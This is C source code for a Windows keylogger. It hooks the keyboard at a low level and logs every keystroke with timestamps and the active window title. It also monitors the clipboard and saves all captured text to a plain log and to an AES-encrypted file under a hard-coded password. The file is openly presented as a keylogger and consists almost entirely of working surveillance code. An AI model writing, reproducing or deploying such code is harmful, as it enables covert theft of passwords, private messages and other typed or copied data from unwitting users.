#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <time.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>


FILE *logFile = NULL;
HHOOK hHook = NULL;
HWND hWnd = NULL;
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
wchar_t lastClipboardContent[1024] = {0};
wchar_t lastWindowName[512] = {0};

void getCurrentWindowName(wchar_t *windowName, size_t bufferSize) {
    HWND hwnd = GetForegroundWindow();
    GetWindowTextW(hwnd, windowName, bufferSize);
}

void aes_encrypt(const char *plaintext, const char *password, char **ciphertext, int *ciphertext_len) {
    EVP_CIPHER_CTX *ctx;
    unsigned char key[32], iv[16], *cipher = NULL;
    int len, plaintext_len = strlen(plaintext);

    // Generate key and IV based on the password
    EVP_BytesToKey(EVP_aes_256_cbc(), EVP_md5(), NULL, (unsigned char *)password, strlen(password), 1, key, iv);
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    cipher = malloc(plaintext_len + AES_BLOCK_SIZE);
    EVP_EncryptUpdate(ctx, cipher, &len, (unsigned char *)plaintext, plaintext_len);
    *ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, cipher + len, &len);
    *ciphertext_len += len;
    *ciphertext = (char *)cipher;

    EVP_CIPHER_CTX_free(ctx);
}

void aes_decrypt(const char *ciphertext, int ciphertext_len, const char *password, char **plaintext) {
    EVP_CIPHER_CTX *ctx;
    unsigned char key[32], iv[16], *plain = NULL;
    int len, plaintext_len;

    // Generate key and IV based on the password
    EVP_BytesToKey(EVP_aes_256_cbc(), EVP_md5(), NULL, (unsigned char *)password, strlen(password), 1, key, iv);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    plain = malloc(ciphertext_len);
    EVP_DecryptUpdate(ctx, plain, &len, (unsigned char *)ciphertext, ciphertext_len);
    plaintext_len = len;
    EVP_DecryptFinal_ex(ctx, plain + len, &len);
    plaintext_len += len;
    plain[plaintext_len] = '\0';
    *plaintext = (char *)plain;

    EVP_CIPHER_CTX_free(ctx);
}

void save_encrypted(const char *filename, const char *content, const char *password) {
    char *encrypted_content = NULL;
    int encrypted_len = 0;
    aes_encrypt(content, password, &encrypted_content, &encrypted_len);
    FILE *file = fopen(filename, "wb");
    fwrite(encrypted_content, 1, encrypted_len, file);
    fclose(file);
    free(encrypted_content);
}

void saveKeystrokes(const wchar_t *content) {
    const char *password = "Lahaja40"; 
    if (logFile) {
        char utf8Buffer[1024] = {0};
        WideCharToMultiByte(CP_UTF8, 0, content, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
        if (wcscmp(content, L"[BACKSPACE]") == 0) {
            fseek(logFile, -1, SEEK_CUR);
            fprintf(logFile, " ");
            fseek(logFile, -1, SEEK_CUR);
        } else {
            fprintf(logFile, "%s", utf8Buffer);
        }
        fflush(logFile);
        fseek(logFile, 0, SEEK_SET);
        long size = ftell(logFile);
        rewind(logFile);
        char *log_content = malloc(size);
        fread(log_content, 1, size, logFile);
        save_encrypted("keystrokes_encrypted.txt", log_content, password);
        free(log_content);
    }
}

void saveWindowNameIfChanged() {
    wchar_t windowName[512] = {0};
    getCurrentWindowName(windowName, sizeof(windowName)/sizeof(wchar_t));
    if (wcscmp(windowName, lastWindowName) != 0) {
        wcscpy(lastWindowName, windowName);
        wchar_t buffer[1024] = {0};
        swprintf(buffer, sizeof(buffer)/sizeof(wchar_t), L"\n[WINDOW: %ls]\n", windowName);
        saveKeystrokes(buffer);
    }
}


void handleSpecialKey(int vkCode, wchar_t *buffer, size_t bufferSize, wchar_t *unshifted, wchar_t *shifted) {
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        wcsncpy(buffer, shifted, bufferSize);
    } else {
        wcsncpy(buffer, shifted, bufferSize);
    }
}


void handleKey(int vkCode, wchar_t* buffer, size_t bufferSize) {
    time_t rawtime;
    struct tm* timeinfo;
    wchar_t timestamp[80];
    saveWindowNameIfChanged();
    if (vkCode >= 'A' && vkCode <= 'Z') {
        if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) ^ (GetKeyState(VK_CAPITAL) & 0x01)) {
            swprintf(buffer, bufferSize, L"%c", vkCode);
        } else {
            swprintf(buffer, bufferSize, L"%c", vkCode + 32);  // Convert to lowercase
        }
    } else if (vkCode >= '0' && vkCode <= '9') {
        const wchar_t *keyChars = L")!@#$%^&*(";
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
            swprintf(buffer, bufferSize, L"%c", keyChars[vkCode - '0']);
        } else {
            swprintf(buffer, bufferSize, L"%c", vkCode);
        }
    } else {
        switch (vkCode) {
            case VK_RETURN:
                time(&rawtime);
                timeinfo = localtime(&rawtime);
                wcsftime(timestamp, sizeof(timestamp)/sizeof(wchar_t), L"%Y-%m-%d %H:%M:%S: ", timeinfo);
                swprintf(buffer, bufferSize, L"\n%s", timestamp);
                break;
            case VK_SPACE:
                wcsncpy(buffer, L" ", bufferSize);
                break;
            case VK_TAB:
                wcsncpy(buffer, L"\t", bufferSize);
                break;
            case VK_BACK:
                {
                    int len = wcslen(buffer);
                    if (len > 0) {
                        buffer[len - 1] = L'\0'; 
                    }
                }
                break;
            case VK_OEM_1:
                handleSpecialKey(vkCode, buffer, bufferSize, L";", L":");
                break;
            case VK_OEM_PLUS:
                handleSpecialKey(vkCode, buffer, bufferSize, L"=", L"+");
                break;
            case VK_OEM_PERIOD:
                handleSpecialKey(vkCode, buffer, bufferSize, L".", L">");
                break;
            case VK_OEM_COMMA:
                handleSpecialKey(vkCode, buffer, bufferSize, L",", L"<");
                break;
            case VK_OEM_2:
                handleSpecialKey(vkCode, buffer, bufferSize, L"/", L"?");
                break;
            default:
                buffer[0] = L'\0';
                break;
        }
    }
}



BOOL setupKeylogger() {
    logFile = fopen("keystrokes.txt", "a+");
    if (!logFile) {
        fprintf(stderr, "Unable to open log file!\n");
        return FALSE;
    }

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!hHook) {
        fprintf(stderr, "Failed to set the keyboard hook.\n");
        fclose(logFile);
        return FALSE;
    }

    return TRUE;
}

void cleanupKeylogger() {
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
    if (hWnd) {
        DestroyWindow(hWnd);
        hWnd = NULL;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        switch (wParam) {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
                KBDLLHOOKSTRUCT *keyStruct = (KBDLLHOOKSTRUCT*)lParam;
                wchar_t keyBuffer[1024] = {0};
                handleKey(keyStruct->vkCode, keyBuffer, sizeof(keyBuffer)/sizeof(wchar_t));
                if(keyBuffer[0] != L'\0') {  // If buffer is not empty
                    wchar_t windowName[512] = {0};
                    getCurrentWindowName(windowName, sizeof(windowName)/sizeof(wchar_t));
                    if (wcscmp(windowName, lastWindowName) != 0) {
                        wcscpy(lastWindowName, windowName);
                        swprintf(keyBuffer, sizeof(keyBuffer)/sizeof(wchar_t), L"\n[WINDOW: %ls]\n%ls", windowName, keyBuffer);
                    }
                    saveKeystrokes(keyBuffer);
                }
                break;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CHANGECBCHAIN:
            // If the next window is closing, repair the chain
            break;
        case WM_DRAWCLIPBOARD:
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t *pszText = GlobalLock(hData);
                    if (pszText && wcsncmp(pszText, lastClipboardContent, 1024) != 0) {
                        swprintf(lastClipboardContent, sizeof(lastClipboardContent)/sizeof(wchar_t), L"CLIPBOARD: %ls", pszText);

                        char utf8Content[1024];
                        WideCharToMultiByte(CP_UTF8, 0, lastClipboardContent, -1, utf8Content, sizeof(utf8Content), NULL, NULL);

                        wchar_t wideContent[1024];
                        MultiByteToWideChar(CP_UTF8, 0, utf8Content, -1, wideContent, sizeof(wideContent)/sizeof(wchar_t));
                        saveKeystrokes(wideContent);

                        wcsncpy(lastClipboardContent, pszText, sizeof(lastClipboardContent));
                    }
                    GlobalUnlock(hData);
                }
                CloseClipboard();
            }
            break;
        default:
            return DefWindowProc(hWnd, uMsg, wParam, lParam);
    }
    return 0;
}



DWORD WINAPI monitorClipboard(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WNDCLASSW wc = {0};
    wc.lpszClassName = L"ClipboardWndClass";
    wc.lpfnWndProc = WndProc;
    RegisterClassW(&wc);
    hWnd = CreateWindowW(L"ClipboardWndClass", NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
    SetClipboardViewer(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnregisterClass("ClipboardWndClass", hInstance);
    return 0;
}

int main() {
    if (!setupKeylogger()) {
        return 1;
    }

     wprintf(L"Keylogger running. Press 'esc' to stop and save.\n");

    // Setup the clipboard monitoring window in a separate thread
    DWORD dwThreadId;
    HANDLE hThread = CreateThread(NULL, 0, monitorClipboard, NULL, 0, &dwThreadId);
    if (!hThread) {
        fprintf(stderr, "Failed to create clipboard monitoring thread.\n");
        cleanupKeylogger();
        return 1;
    }

    // Main message loop
    MSG msg;
    BOOL bRet;
    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
        if (bRet == -1) {
            fprintf(stderr, "An error occurred while getting a message.\n");
            break;
        } else {
            if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
                break;  // Stop on 'esc' key press
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    cleanupKeylogger();
    return 0;
}